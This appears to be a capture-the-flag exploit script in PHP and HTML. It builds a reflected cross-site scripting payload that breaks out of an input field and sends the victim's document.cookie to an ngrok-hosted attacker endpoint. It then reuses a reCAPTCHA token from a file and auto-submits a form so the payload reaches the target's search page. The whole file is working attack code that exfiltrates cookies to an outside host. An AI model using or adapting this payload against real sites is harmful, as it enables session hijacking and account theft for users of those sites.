<?php

$payload = urlencode('A"><script>fetch("http://2ddf-2804-14d-5cd0-9fd9-2004-8879-b73e-213e.ngrok.io/flag?="+encodeURIComponent(document.cookie), {"mode": "no-cors"});</script><input class="lst" value="B');

$captcha = file_get_contents('g-recaptcha-response');

while ($captcha == false) {
    sleep(2);
    $captcha = file_get_contents('g-recaptcha-response');
}

?>

<html>
    <form action="http://google.us.ctf.so/search.php?q=<?php echo $payload; ?>" method="POST" name="f" id="search">
        <input type="text" name="q" dir="ltr" value="something"/>
        <input type="hidden" name="g-recaptcha-response" value="<?php echo $captcha; ?>"/>
        <input type="hidden" name="btnG" value="Google Search"/>
    </form>

    <script>
        frm = document.getElementById("search");
        frm.submit();
    </script>
</html>